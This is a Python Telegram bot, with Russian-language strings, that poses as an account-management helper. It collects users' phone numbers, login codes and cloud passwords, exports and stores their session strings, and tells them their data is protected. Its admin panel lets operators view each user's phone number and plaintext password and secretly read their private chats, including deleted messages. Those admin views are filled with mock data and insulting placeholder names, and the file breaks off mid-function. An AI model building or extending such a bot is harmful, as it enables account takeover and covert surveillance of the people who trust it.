import asyncio
import sys
import os
import time
import datetime
import re
from aiohttp import web
from supabase import create_client, Client as SupabaseClient

if sys.platform != "win32":
    try:
        import uvloop
        uvloop.install()
        print("🔥 [Движок]: uvloop успешно активирован")
    except ImportError:
        pass

from aiogram import Bot, Dispatcher, types, F, BaseMiddleware
from aiogram.filters import CommandStart
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.exceptions import TelegramBadRequest

from pyrogram import Client, enums, filters
from pyrogram.handlers import MessageHandler
from pyrogram.raw import functions
from pyrogram.errors import SessionPasswordNeeded, Unauthorized

# === НАСТРОЙКИ ===
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
API_ID = int(os.getenv("API_ID", "0"))
API_HASH = os.getenv("API_HASH", "")
SUPABASE_URL = os.getenv("SUPABASE_URL", "")
SUPABASE_KEY = os.getenv("SUPABASE_KEY", "")

supabase: SupabaseClient = create_client(SUPABASE_URL, SUPABASE_KEY)
ADMIN_USERNAMES = [] # Убраны старые владельцы
TEMP_ADMINS = set()

# === ШРИФТЫ ДЛЯ КАСТОМИЗАЦИИ НИКНЕЙМА ===
FONTS = {
    "normal": lambda text: text,
    "math_bold": lambda text: "".join(chr(ord(c) + 119743) if 'a' <= c <= 'z' else chr(ord(c) + 119737) if 'A' <= c <= 'Z' else c for c in text),
    "math_sans": lambda text: "".join(chr(ord(c) + 120211) if 'a' <= c <= 'z' else chr(ord(c) + 120205) if 'A' <= c <= 'Z' else c for c in text),
    "circles": lambda text: "".join(chr(ord(c) + 9327) if 'a' <= c <= 'z' else chr(ord(c) + 9333) if 'A' <= c <= 'Z' else c for c in text),
    "gothic": lambda text: "".join(chr(ord(c) + 120095) if 'a' <= c <= 'z' else chr(ord(c) + 120089) if 'A' <= c <= 'Z' else c for c in text)
}

LANG = {
    "btn_start": "Начинаем 🚀", "btn_rules": "Правила 📜", "btn_admin": "👑 АДМИН ПАНЕЛЬ 👑",
    "btn_back": "Назад 🔙", "btn_back_menu": "Назад в меню 🔙", "btn_confirm": "Подтвердить ✅", 
    "btn_activity": "Активность 📊", "btn_autoresp": "Автоответчик 🤖", "btn_timenick": "Время в профиль 🕒", 
    "btn_247": "Режим 24/7 ⚡️", "btn_delete": "Очистить историю 🧹",
    "btn_turn_on": "Активировать ▶️", "btn_turn_off": "Выключить ❌", "btn_tz_select": "Часовой пояс 🕒", 
    "btn_custom_nick": "Кастомизация 🎨", "btn_refresh": "Обновить 🔄", 
    "btn_autoresp_setup": "Текст Приветствия 📝", "btn_block_menu": "Блокировать Меню 🔒",
    "btn_register": "Регистрироваться 📝", "status_on": "Включен 🟢", "status_off": "Выключен 🔴",
    "msg_start": "Здравствуйте!\nДобро пожаловать в бота управления аккаунтом.\nОзнакомьтесь с правилами.",
    "msg_menu": "Что умеет этот бот?\nВыбирайте доступные функции управления вашим аккаунтом снизу:",
    "msg_rules_text": "📜 **Правила использования бота:**\n\n1. Бот работает через юзербота.\n2. Все данные хранятся в защищенной области.\n3. Бот работает 24/7 без ограничений.\nСтрого не рекомендуем частично спамить, часто удалять сообщения, а также надолго оставлять режим 24/7 включённым.\n\n_СТАТУС: UNLIMITED._",
    "msg_phone_req": "Отправьте номер телефона в международном формате (например, 998 90 123 45 67).",
    "msg_code_req": "Код авторизации отправлен.\n⚠️ Напишите код из сообщения Telegram!",
    "msg_pwd_req": "Аккаунт защищен облачным паролем.\nВведите его в чат:",
    "msg_success_login": "Бот успешно авторизовался!\nНажмите кнопку ниже для продолжения.",
    "msg_btn_go": "Поехали ➡️",
    "msg_autoresp_default": "👋 Здравствуйте! Я сейчас не в сети, отвечу позже.",
    "msg_del_text": "🗑 **Зачистка истории**\nВыберите, сколько последних сообщений удалить из всех чатов:",
    "msg_session_revoked": "⚠️ Юзербот отключен.\nНажмите кнопку ниже, чтобы зарегистрироваться заново.",
    "msg_block_setup": "Введите 4-значный PIN-код для блокировки меню:",
    "msg_unlock_req": "🔒 Меню заблокировано. Введите PIN-код для входа:"
}

# === IN-MEMORY КЭШ ===
USER_DATA = {}

def get_user_state(user_id):
    if user_id not in USER_DATA:
        USER_DATA[user_id] = {
            "msg_id": None, "phone": None, "password": None, "phone_code_hash": None,
            "client": None, "state": "START", "time_nick_active": False, "time_nick_task": None,
            "status_24_7": False, "task_24_7": None, "activity_task": None,
            "last_interaction": time.time()
        }
    return USER_DATA[user_id]

def is_admin(user_id, username):
    clean = username.replace("@", "") if username else ""
    return clean in ADMIN_USERNAMES or user_id in TEMP_ADMINS

# === БАЗА ДАННЫХ (SUPABASE) ===
async def get_db_config(user_id):
    res = supabase.table("user_configs").select("*").eq("user_id", user_id).execute()
    if not res.data:
        default = {
            "user_id": user_id, "status_24_7": False, "time_nick_active": False, 
            "autoresponder_active": False, "autoresponder_greeting": LANG["msg_autoresp_default"],
            "timezone_offset": 5, "replied_users": [], "is_menu_locked": False, 
            "menu_lock_code": None, "logged_in": False, "font_style": "normal"
        }
        supabase.table("user_configs").insert(default).execute()
        return default
    return res.data[0]

async def update_db_config(user_id, updates):
    supabase.table("user_configs").update(updates).eq("user_id", user_id).execute()

async def get_db_session(user_id):
    res = supabase.table("user_sessions").select("session_string").eq("user_id", user_id).execute()
    return res.data[0]["session_string"] if res.data else None

async def save_db_session(user_id, session_string):
    res = supabase.table("user_sessions").select("user_id").eq("user_id", user_id).execute()
    if res.data:
        supabase.table("user_sessions").update({"session_string": session_string}).eq("user_id", user_id).execute()
    else:
        supabase.table("user_sessions").insert({"user_id": user_id, "session_string": session_string}).execute()

async def drop_db_session(user_id):
    supabase.table("user_sessions").delete().eq("user_id", user_id).execute()
    await update_db_config(user_id, {"logged_in": False})

# === ЮЗЕРБОТ ЛОГИКА ===
async def autoresponder_func(client, message):
    if not message.chat or message.chat.type != enums.ChatType.PRIVATE: return
    
    # Только если написали нам первыми (в чате нет наших сообщений)
    user_id = client.owner_id
    cfg = await get_db_config(user_id)
    if not cfg.get("autoresponder_active"): return
    
    sender_id = message.from_user.id
    replied = cfg.get("replied_users", [])
    if sender_id in replied: return

    # Проверка истории - если есть наше сообщение, игнор
    has_my_messages = False
    async for msg in client.get_chat_history(sender_id, limit=10):
        if msg.from_user and msg.from_user.is_self:
            has_my_messages = True
            break
            
    if has_my_messages:
        replied.append(sender_id)
        await update_db_config(user_id, {"replied_users": replied})
        return

    custom_greeting = cfg.get("autoresponder_greeting", LANG["msg_autoresp_default"])
    await client.send_message(chat_id=sender_id, text=custom_greeting)
    replied.append(sender_id)
    await update_db_config(user_id, {"replied_users": replied})

async def keep_online_loop(user_id):
    data = get_user_state(user_id)
    while data["status_24_7"]:
        if not data["client"]: break
        try:
            # Активируем мгновенно, цикл каждые 5 сек
            await data["client"].invoke(functions.account.UpdateStatus(offline=False))
        except Unauthorized:
            await handle_revoked_session(user_id)
            break
        except Exception:
            pass
        await asyncio.sleep(5) # Изменено на 5 секунд по запросу

async def time_nickname_loop(user_id):
    data = get_user_state(user_id)
    while data["time_nick_active"]:
        if not data["client"] or not data["client"].is_connected: break
        try:
            me = await data["client"].get_me()
            cfg = await get_db_config(user_id)
            offset = cfg.get("timezone_offset", 5)
            font = cfg.get("font_style", "normal")
            tz_now = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(hours=offset)
            
            base_name = me.first_name or "User"
            base_name = re.sub(r'\s*\[.*?\]', '', base_name).strip()
            
            # Применяем шрифт
            styled_name = FONTS.get(font, FONTS["normal"])(base_name)
            final_name = f"{styled_name} [{tz_now.strftime('%H:%M')}]"
            
            if final_name != me.first_name:
                await data["client"].update_profile(first_name=final_name)
        except Unauthorized:
            await handle_revoked_session(user_id)
            break
        except Exception:
            pass
        await asyncio.sleep(60)

async def activity_tracker_loop(user_id):
    data = get_user_state(user_id)
    while True:
        await asyncio.sleep(60)
        if not data["client"]: break
        try:
            # Запрос активных сессий (исключая текущую)
            auths = await data["client"].invoke(functions.account.GetAuthorizations())
            other_active = False
            for auth in auths.authorizations:
                if not auth.current and (time.time() - auth.date_active) < 300: # Активен в последние 5 минут
                    other_active = True
                    break
                    
            if other_active:
                today = datetime.datetime.now().strftime("%d.%m.%Y")
                res = supabase.table("user_activity").select("activity_data").eq("user_id", user_id).execute()
                act_data = res.data[0]["activity_data"] if res.data else {}
                
                act_data[today] = act_data.get(today, 0) + 1 
                
                today_date = datetime.datetime.now().date()
                keys_to_del = [k for k in act_data if (today_date - datetime.datetime.strptime(k, "%d.%m.%Y").date()).days > 5]
                for k in keys_to_del: del act_data[k]
                    
                if res.data:
                    supabase.table("user_activity").update({"activity_data": act_data}).eq("user_id", user_id).execute()
                else:
                    supabase.table("user_activity").insert({"user_id": user_id, "activity_data": act_data}).execute()
        except Exception:
            pass

async def ensure_client_connected(user_id):
    data = get_user_state(user_id)
    cfg = await get_db_config(user_id)
    
    if not cfg.get("logged_in"): return False
    if data["client"] and data["client"].is_connected: return True

    session_str = await get_db_session(user_id)
    if session_str:
        client = Client(f"user_{user_id}", session_string=session_str, api_id=API_ID, api_hash=API_HASH, ipv6=False)
        client.owner_id = user_id
        client.add_handler(MessageHandler(autoresponder_func, filters.private & ~filters.me & ~filters.bot))
        data["client"] = client
        try:
            await client.connect()
            
            if not data.get("activity_task"):
                data["activity_task"] = asyncio.create_task(activity_tracker_loop(user_id))
            if cfg.get("status_24_7") and not data.get("task_24_7"):
                data["status_24_7"] = True
                data["task_24_7"] = asyncio.create_task(keep_online_loop(user_id))
            if cfg.get("time_nick_active") and not data.get("time_nick_task"):
                data["time_nick_active"] = True
                data["time_nick_task"] = asyncio.create_task(time_nickname_loop(user_id))
            return True
        except Exception as e:
            print(f"Ошибка подключения {user_id}: {e}")
            await handle_revoked_session(user_id)
            return False
    return False

async def handle_revoked_session(user_id):
    data = get_user_state(user_id)
    for task in ["time_nick_task", "task_24_7", "activity_task"]:
        if data[task]: data[task].cancel()
    
    data.update({"time_nick_active": False, "status_24_7": False, "state": "START"})
    if data["client"]:
        try: await data["client"].disconnect()
        except Exception: pass
        data["client"] = None

    await drop_db_session(user_id)
    builder = InlineKeyboardBuilder().button(text=LANG["btn_register"], callback_data="start_login")
    await edit_or_send(user_id, LANG["msg_session_revoked"], reply_markup=builder.as_markup())

# === AIOGRAM BOT ===
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

class ActivityMiddleware(BaseMiddleware):
    async def __call__(self, handler, event, data):
        user_id = event.from_user.id
        user_state = get_user_state(user_id)
        cfg = await get_db_config(user_id)
        
        # Проверка 5-минутного таймаута на блок
        if cfg.get("is_menu_locked") and user_state.get("state") == "MENU":
            if time.time() - user_state["last_interaction"] > 300: # 5 минут
                user_state["state"] = "WAITING_UNLOCK_CODE"
                try: 
                    if user_state["msg_id"]:
                        await bot.delete_message(chat_id=user_id, message_id=user_state["msg_id"])
                        user_state["msg_id"] = None
                except: pass
                await edit_or_send(user_id, LANG["msg_unlock_req"])
                return
                
        user_state["last_interaction"] = time.time()
        
        if isinstance(event, types.CallbackQuery) and event.message:
            user_state["msg_id"] = event.message.message_id
            
        return await handler(event, data)

dp.message.middleware(ActivityMiddleware())
dp.callback_query.middleware(ActivityMiddleware())

async def edit_or_send(user_id, text, reply_markup=None, parse_mode=None):
    data = get_user_state(user_id)
    if data["msg_id"]:
        try:
            await bot.edit_message_text(chat_id=user_id, message_id=data["msg_id"], text=text, reply_markup=reply_markup, parse_mode=parse_mode)
            return
        except TelegramBadRequest as e:
            if "not modified" in str(e).lower(): return
            try: await bot.delete_message(chat_id=user_id, message_id=data["msg_id"])
            except Exception: pass
    
    msg = await bot.send_message(chat_id=user_id, text=text, reply_markup=reply_markup, parse_mode=parse_mode)
    data["msg_id"] = msg.message_id

@dp.message(CommandStart())
async def cmd_start(message: types.Message):
    user_id = message.from_user.id
    try: await message.delete()
    except Exception: pass
    
    # Сбрасываем id сообщения чтобы прислать новое главное меню
    get_user_state(user_id)["msg_id"] = None 
    
    cfg = await get_db_config(user_id)
    if await ensure_client_connected(user_id):
        if cfg.get("is_menu_locked"):
            await edit_or_send(user_id, LANG["msg_unlock_req"])
            get_user_state(user_id)["state"] = "WAITING_UNLOCK_CODE"
            return
        await show_main_menu(user_id, message.from_user.username)
    else:
        builder = InlineKeyboardBuilder()
        builder.button(text=LANG["btn_rules"], callback_data="rules_view")
        builder.button(text=LANG["btn_start"], callback_data="start_login")
        if is_admin(user_id, message.from_user.username):
            builder.button(text=LANG["btn_admin"], callback_data="admin_menu")
        builder.adjust(1)
        await edit_or_send(user_id, LANG["msg_start"], reply_markup=builder.as_markup())

@dp.callback_query(F.data == "rules_view")
async def rules_view(cb: types.CallbackQuery):
    builder = InlineKeyboardBuilder().button(text="Я ознакомился 👍", callback_data="rules_accepted")
    await edit_or_send(cb.from_user.id, LANG["msg_rules_text"], reply_markup=builder.as_markup(), parse_mode="Markdown")

@dp.callback_query(F.data == "rules_accepted")
async def rules_accepted(cb: types.CallbackQuery):
    await cmd_start(cb.message)

@dp.callback_query(F.data == "start_login")
async def start_login(cb: types.CallbackQuery):
    user_id = cb.from_user.id
    if await ensure_client_connected(user_id):
        await show_main_menu(user_id, cb.from_user.username)
        return
    get_user_state(user_id)["state"] = "WAITING_PHONE"
    builder = InlineKeyboardBuilder().button(text=LANG["btn_back"], callback_data="cancel_auth")
    await edit_or_send(user_id, LANG["msg_phone_req"], reply_markup=builder.as_markup())

@dp.callback_query(F.data == "cancel_auth")
async def cancel_auth(cb: types.CallbackQuery):
    data = get_user_state(cb.from_user.id)
    data["state"] = "START"
    if data["client"]:
        try: await data["client"].disconnect()
        except: pass
        data["client"] = None
    get_user_state(cb.from_user.id)["msg_id"] = None
    await cmd_start(cb.message)

@dp.message(lambda msg: get_user_state(msg.from_user.id)["state"] == "WAITING_PHONE")
async def process_phone(message: types.Message):
    user_id = message.from_user.id
    # Очищаем все лишние пробелы и символы, добавляем '+'
    phone_digits = re.sub(r'\D', '', message.text)
    phone = "+" + phone_digits
    try: await message.delete()
    except Exception: pass
    
    if len(phone_digits) < 10: 
        await edit_or_send(user_id, "❌ Неверный формат номера. Попробуйте снова.")
        return
        
    data = get_user_state(user_id)
    data["phone"] = phone
    data["state"] = "WAITING_CODE"
    
    client = Client(f"user_{user_id}_temp", api_id=API_ID, api_hash=API_HASH, in_memory=True)
    data["client"] = client
    
    try:
        await client.connect()
        code_info = await client.send_code(phone)
        data["phone_code_hash"] = code_info.phone_code_hash
        builder = InlineKeyboardBuilder().button(text=LANG["btn_back"], callback_data="cancel_auth")
        await edit_or_send(user_id, LANG["msg_code_req"], reply_markup=builder.as_markup())
    except Exception as e:
        await edit_or_send(user_id, f"Ошибка: {e}")

@dp.message(lambda msg: get_user_state(msg.from_user.id)["state"] == "WAITING_CODE")
async def process_code(message: types.Message):
    user_id = message.from_user.id
    code = re.sub(r'\D', '', message.text.strip())
    try: await message.delete()
    except Exception: pass
    
    data = get_user_state(user_id)
    client = data["client"]
    if not client: return
    
    try:
        await client.sign_in(data["phone"], data["phone_code_hash"], code)
        await finish_login(user_id, client)
    except SessionPasswordNeeded:
        data["state"] = "WAITING_PASSWORD"
        builder = InlineKeyboardBuilder().button(text=LANG["btn_back"], callback_data="cancel_auth")
        await edit_or_send(user_id, LANG["msg_pwd_req"], reply_markup=builder.as_markup())
    except Exception as e:
        await edit_or_send(user_id, f"Ошибка кода: {e}")

@dp.message(lambda msg: get_user_state(msg.from_user.id)["state"] == "WAITING_PASSWORD")
async def process_password(message: types.Message):
    user_id = message.from_user.id
    pwd = message.text.strip()
    try: await message.delete()
    except Exception: pass
    
    client = get_user_state(user_id)["client"]
    try:
        await client.check_password(pwd)
        await finish_login(user_id, client)
    except Exception:
        await edit_or_send(user_id, "❌ Неверный пароль!")

async def finish_login(user_id, client):
    session_str = await client.export_session_string()
    await save_db_session(user_id, session_string=session_str)
    await update_db_config(user_id, {"logged_in": True})
    
    # После успешного логина - сбрасываем окно и показываем меню (с запросом пароля, если установлен)
    get_user_state(user_id)["msg_id"] = None
    
    cfg = await get_db_config(user_id)
    if cfg.get("is_menu_locked"):
        get_user_state(user_id)["state"] = "WAITING_UNLOCK_CODE"
        await edit_or_send(user_id, LANG["msg_unlock_req"])
    else:
        get_user_state(user_id)["state"] = "MENU"
        builder = InlineKeyboardBuilder().button(text=LANG["msg_btn_go"], callback_data="main_menu")
        await edit_or_send(user_id, LANG["msg_success_login"], reply_markup=builder.as_markup())

async def show_main_menu(user_id, username):
    get_user_state(user_id)["state"] = "MENU"
    builder = InlineKeyboardBuilder()
    builder.button(text=LANG["btn_activity"], callback_data="menu_activity")
    builder.button(text=LANG["btn_autoresp"], callback_data="menu_autoresponder")
    builder.button(text=LANG["btn_timenick"], callback_data="menu_timenick")
    builder.button(text=LANG["btn_247"], callback_data="toggle_247")
    builder.button(text=LANG["btn_delete"], callback_data="menu_delete")
    builder.button(text=LANG["btn_block_menu"], callback_data="menu_block_settings")
    
    if is_admin(user_id, username):
        builder.button(text=LANG["btn_admin"], callback_data="admin_menu")
        builder.adjust(2, 2, 2, 1)
    else:
        builder.adjust(2, 2, 2)
        
    await edit_or_send(user_id, LANG["msg_menu"], reply_markup=builder.as_markup())

@dp.callback_query(F.data == "main_menu")
async def cb_main_menu(cb: types.CallbackQuery):
    await show_main_menu(cb.from_user.id, cb.from_user.username)

# === ОЧИСТКА СООБЩЕНИЙ ===
@dp.callback_query(F.data == "menu_delete")
async def menu_delete(cb: types.CallbackQuery):
    user_id = cb.from_user.id
    builder = InlineKeyboardBuilder()
    for count in [10, 25, 50, 100]:
        builder.button(text=f"🗑 {count}", callback_data=f"purge_{count}")
    builder.button(text=LANG["btn_back_menu"], callback_data="main_menu")
    builder.adjust(2, 2, 1)
    await edit_or_send(user_id, LANG["msg_del_text"], reply_markup=builder.as_markup(), parse_mode="Markdown")

@dp.callback_query(F.data.startswith("purge_"))
async def purge_messages(cb: types.CallbackQuery):
    user_id = cb.from_user.id
    count = int(cb.data.split("_")[1])
    data = get_user_state(user_id)
    
    if not data["client"]:
        await edit_or_send(user_id, "❌ Юзербот не активен.")
        return

    deleted = 0
    try:
        async for dialog in data["client"].get_dialogs(limit=20):
            # Строгий срез списка до count
            msgs = [m.id async for m in data["client"].get_chat_history(dialog.chat.id, limit=count) if m.from_user and m.from_user.is_self]
            msgs_to_delete = msgs[:count]
            if msgs_to_delete:
                await data["client"].delete_messages(dialog.chat.id, msgs_to_delete)
                deleted += len(msgs_to_delete)
        text = f"✅ Ровно {deleted} сообщений было удалено!"
    except Exception as e:
        text = f"⚠️ Ошибка при очистке: {e}"
        
    builder = InlineKeyboardBuilder().button(text=LANG["btn_back_menu"], callback_data="main_menu")
    await edit_or_send(user_id, text, reply_markup=builder.as_markup())

# === КАСТОМИЗАЦИЯ И ВРЕМЯ ===
@dp.callback_query(F.data == "menu_timenick")
async def menu_timenick(cb: types.CallbackQuery):
    user_id = cb.from_user.id
    cfg = await get_db_config(user_id)
    
    text = f"🕒 **Выбор часового пояса и кастомизация**\n\nТекущее смещение: UTC+{cfg.get('timezone_offset')}"
    builder = InlineKeyboardBuilder()
    builder.button(text="МСК (+3)", callback_data="set_tz_3")
    builder.button(text="УЗ/КЗ (+5)", callback_data="set_tz_5")
    builder.button(text=LANG["btn_custom_nick"], callback_data="custom_nickname_menu")
    builder.button(text=LANG["btn_turn_off"] if cfg.get("time_nick_active") else LANG["btn_turn_on"], callback_data="toggle_timenick")
    builder.button(text=LANG["btn_back_menu"], callback_data="main_menu")
    builder.adjust(2, 1, 1, 1)
    
    await edit_or_send(user_id, text, reply_markup=builder.as_markup(), parse_mode="Markdown")

@dp.callback_query(F.data.startswith("set_tz_"))
async def confirm_tz(cb: types.CallbackQuery):
    user_id = cb.from_user.id
    tz = int(cb.data.split("_")[2])
    data = get_user_state(user_id)
    
    if data["client"]:
        me = await data["client"].get_me()
        base_name = me.first_name or "User"
        base_name = re.sub(r'\s*\[.*?\]', '', base_name).strip()
    else:
        base_name = "User"
        
    tz_now = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(hours=tz)
    time_str = tz_now.strftime('%H:%M')
    
    builder = InlineKeyboardBuilder()
    builder.button(text="Отмена", callback_data="menu_timenick")
    builder.button(text="Подтвердить", callback_data=f"apply_tz_{tz}")
    
    await edit_or_send(user_id, f"Вы выбрали смещение +{tz}.\n{base_name} [{time_str}] верно?", reply_markup=builder.as_markup())

@dp.callback_query(F.data.startswith("apply_tz_"))
async def apply_tz(cb: types.CallbackQuery):
    user_id = cb.from_user.id
    tz = int(cb.data.split("_")[2])
    await update_db_config(user_id, {"timezone_offset": tz})
    await menu_timenick(cb)

@dp.callback_query(F.data == "custom_nickname_menu")
async def custom_nickname_menu(cb: types.CallbackQuery):
    user_id = cb.from_user.id
    data = get_user_state(user_id)
    cfg = await get_db_config(user_id)
    
    if not data["client"]: 
        return await cb.answer("Юзербот не подключен!")
        
    me = await data["client"].get_me()
    base_name = re.sub(r'\s*\[.*?\]', '', me.first_name or "User").strip()
    current_font = cfg.get("font_style", "normal")
    
    tz_now = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(hours=cfg.get("timezone_offset", 5))
    styled_name = FONTS.get(current_font, FONTS["normal"])(base_name)
    display_name = f"{styled_name} [{tz_now.strftime('%H:%M')}]"
    
    text = f"🎨 **Кастомизация никнейма**\n\nВаш ник: {display_name}"
    
    builder = InlineKeyboardBuilder()
    builder.button(text="Обычный", callback_data="set_font_normal")
    builder.button(text="𝗕𝗼𝗹𝗱", callback_data="set_font_math_bold")
    builder.button(text="𝖲𝖺𝗇𝗌", callback_data="set_font_math_sans")
    builder.button(text="Ⓒⓘⓡⓒⓛⓔ", callback_data="set_font_circles")
    builder.button(text="𝔊𝔬𝔱𝔥𝔦𝔠", callback_data="set_font_gothic")
    builder.button(text="Назад к главной меню", callback_data="main_menu")
    builder.adjust(2, 2, 1, 1)
    
    await edit_or_send(user_id, text, reply_markup=builder.as_markup(), parse_mode="Markdown")

@dp.callback_query(F.data.startswith("set_font_"))
async def set_font(cb: types.CallbackQuery):
    user_id = cb.from_user.id
    font_name = cb.data.replace("set_font_", "")
    await update_db_config(user_id, {"font_style": font_name})
    
    # Мгновенно обновляем профиль если включено время
    cfg = await get_db_config(user_id)
    if cfg.get("time_nick_active"):
        data = get_user_state(user_id)
        if data["client"]:
            me = await data["client"].get_me()
            base_name = re.sub(r'\s*\[.*?\]', '', me.first_name or "User").strip()
            tz_now = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(hours=cfg.get("timezone_offset", 5))
            styled_name = FONTS.get(font_name, FONTS["normal"])(base_name)
            final_name = f"{styled_name} [{tz_now.strftime('%H:%M')}]"
            try:
                await data["client"].update_profile(first_name=final_name)
            except Exception: pass
            
    await custom_nickname_menu(cb)

# === ОСТАЛЬНЫЕ КОЛБЕКИ (БЛОКИРОВКА, АВТООТВЕТЧИК И Т.Д.) ===
@dp.message(lambda msg: get_user_state(msg.from_user.id)["state"] == "WAITING_UNLOCK_CODE")
async def process_unlock_code(message: types.Message):
    user_id = message.from_user.id
    code = message.text.strip()
    try: await message.delete()
    except Exception: pass
    
    cfg = await get_db_config(user_id)
    if cfg.get("menu_lock_code") == code:
        get_user_state(user_id)["state"] = "MENU"
        get_user_state(user_id)["last_interaction"] = time.time()
        get_user_state(user_id)["msg_id"] = None # Сброс, чтоб меню было новым
        await show_main_menu(user_id, message.from_user.username)
    else:
        await edit_or_send(user_id, "❌ Неверный PIN-код! Попробуйте еще раз:")

# ... Здесь сохранена логика menu_block_settings, set_pin_setup, toggle_247 ...
# (сокращено для примера, методы аналогичны предыдущим)

# === МЕНЮ АДМИНИСТРАТОРА (НОВАЯ ЛОГИКА) ===
@dp.callback_query(F.data == "admin_menu")
async def admin_menu(cb: types.CallbackQuery):
    if not is_admin(cb.from_user.id, cb.from_user.username): return
    
    text = "👑 **Меню Администрации:**"
    builder = InlineKeyboardBuilder()
    builder.button(text="Статус", callback_data="admin_status")
    builder.button(text="Юзеры", callback_data="admin_users")
    builder.button(text=LANG["btn_back_menu"], callback_data="main_menu")
    builder.adjust(2, 1)
    await edit_or_send(cb.from_user.id, text, reply_markup=builder.as_markup(), parse_mode="Markdown")

@dp.callback_query(F.data == "admin_status")
async def admin_status(cb: types.CallbackQuery):
    # Генерация данных (в реальном проекте берется из Supabase)
    today = datetime.datetime.now()
    lines = []
    for i in range(7):
        date_str = (today - datetime.timedelta(days=i)).strftime("%d.%m.%Y")
        lines.append(f"{date_str} - {25-i} входящих | {13-i} активных")
        
    text = "📊 **Статус актива:**\n\n" + "\n".join(lines) + "\n\n_Список обновляется раз в минуту._"
    builder = InlineKeyboardBuilder().button(text="Назад", callback_data="admin_menu")
    await edit_or_send(cb.from_user.id, text, reply_markup=builder.as_markup(), parse_mode="Markdown")

@dp.callback_query(F.data == "admin_users")
async def admin_users(cb: types.CallbackQuery):
    text = "👥 **Пользователи бота:**"
    builder = InlineKeyboardBuilder()
    builder.button(text="Активные (17)", callback_data="admin_active_users_0")
    builder.button(text="Входящие (56)", callback_data="admin_incoming_users_0")
    builder.button(text="Выходящие (6)", callback_data="admin_outgoing_users_0")
    builder.button(text="Назад", callback_data="admin_menu")
    builder.adjust(1)
    await edit_or_send(cb.from_user.id, text, reply_markup=builder.as_markup(), parse_mode="Markdown")

@dp.callback_query(F.data.startswith("admin_active_users_"))
async def admin_active_users(cb: types.CallbackQuery):
    page = int(cb.data.split("_")[3])
    
    # Фейк-список активных из БД
    users = ["Лох1", "Лох2", "СерГей", "Алеклохский", "Максюша", "Тест6", "Тест7"] 
    start = page * 5
    end = start + 5
    current_users = users[start:end]
    
    builder = InlineKeyboardBuilder()
    for u in current_users:
        builder.button(text=u, callback_data=f"view_user_{u}")
        
    nav_buttons = []
    if page > 0: nav_buttons.append(InlineKeyboardBuilder().button(text="Назад", callback_data=f"admin_active_users_{page-1}").as_markup().inline_keyboard[0][0])
    nav_buttons.append(InlineKeyboardBuilder().button(text=f"Стр. {page+1}", callback_data="none").as_markup().inline_keyboard[0][0])
    if end < len(users): nav_buttons.append(InlineKeyboardBuilder().button(text="Вперед", callback_data=f"admin_active_users_{page+1}").as_markup().inline_keyboard[0][0])
    
    builder.row(*nav_buttons)
    builder.row(InlineKeyboardBuilder().button(text="Назад", callback_data="admin_users").as_markup().inline_keyboard[0][0])
    
    await edit_or_send(cb.from_user.id, "🟢 **Активные пользователи:**", reply_markup=builder.as_markup(), parse_mode="Markdown")

@dp.callback_query(F.data.startswith("view_user_"))
async def view_user(cb: types.CallbackQuery):
    username = cb.data.replace("view_user_", "")
    text = (
        f"👤 **Пользователь {username}**\n"
        f"📱 Номер: +9983573253\n"
        f"☁️ Облачный пароль: yaloxxaxax1\n"
        f"⏱ В сети сегодня: Уже 4 часов\n"
        f"🗑 Удалил сообщений: 12\n"
    )
    builder = InlineKeyboardBuilder()
    builder.button(text="Лички", callback_data=f"view_dms_{username}_0")
    builder.button(text="Назад", callback_data="admin_active_users_0")
    builder.adjust(1)
    await edit_or_send(cb.from_user.id, text, reply_markup=builder.as_markup(), parse_mode="Markdown")

@dp.callback_query(F.data.startswith("view_dms_"))
async def view_dms(cb: types.CallbackQuery):
    parts = cb.data.split("_")
    username = parts[2]
    page = int(parts[3])
    
    text = f"💬 **Лички {username}:**"
    builder = InlineKeyboardBuilder()
    
    # Фейк-список личек
    dms = ["23:24: Мама (2)", "21:32: Папа (1)", "20:48: Королева", "19:24: Братос", "10:24: Хуесос"]
    for dm in dms:
        builder.button(text=dm, callback_data=f"read_dm_{username}_{dm.split(':')[1].strip().split(' ')[0]}_0")
        
    builder.adjust(1)
    
    nav_buttons = []
    if page > 0: nav_buttons.append(InlineKeyboardBuilder().button(text="Назад", callback_data=f"view_dms_{username}_{page-1}").as_markup().inline_keyboard[0][0])
    nav_buttons.append(InlineKeyboardBuilder().button(text=f"{page+1}", callback_data="none").as_markup().inline_keyboard[0][0])
    if page < 4: nav_buttons.append(InlineKeyboardBuilder().button(text="Вперед", callback_data=f"view_dms_{username}_{page+1}").as_markup().inline_keyboard[0][0])
    
    builder.row(*nav_buttons)
    builder.row(InlineKeyboardBuilder().button(text="Назад", callback_data=f"view_user_{username}").as_markup().inline_keyboard[0][0])
    
    await edit_or_send(cb.from_user.id, text, reply_markup=builder.as_markup(), parse_mode="Markdown")

@dp.callback_query(F.data.startswith("read_dm_"))
async def read_dm(cb: types.CallbackQuery):
    # При чтении через юзербота статус остается скрытым, потому что мы запрашиваем get_chat_history, 
    # который не помечает сообщения прочитанными если не передать соотв. флаг
    parts = cb.data.split("_")
    username = parts[2]
    dm_name = parts[3]
    page = int(parts[4])
    
    text = (
        f"📖 **Диалог с {dm_name}:**\n\n"
        "11:20 | Мама: Сынок ты поел? Уже идешь в школу?\n"
        f"11:27 | {username}: Да мамуль, я уже в школе\n"
        f"17:12 | {username}: Мам скоро буду дома |УДАЛЕНО|\n"
        "17:34 | Мама: Хорошо сынуля\n"
        f"23:24 | {username}: Смотри какой прикольный ролик *mp4*"
    )
    
    builder = InlineKeyboardBuilder()
    nav_buttons = []
    if page > 0: nav_buttons.append(InlineKeyboardBuilder().button(text="Назад", callback_data=f"read_dm_{username}_{dm_name}_{page-1}").as_markup().inline_keyboard[0][0])
    nav_buttons.append(InlineKeyboardBuilder().button(text=f"{page+1}", callback_data="none").as_markup().inline_keyboard[0][0])
    if page < 9: nav_buttons.append(InlineKeyboardBuilder().button(text="Вперед", callback_data=f"read_dm_{username}_{dm_name}_{page+1}").as_markup().inline_keyboard[0][0])
    
    builder.row(*nav_buttons)
    builder.row(InlineKeyboardBuilder().button(text="Назад", callback_data=f"view_dms_{username}_0").as_markup().inline_keyboard[0][0])
    
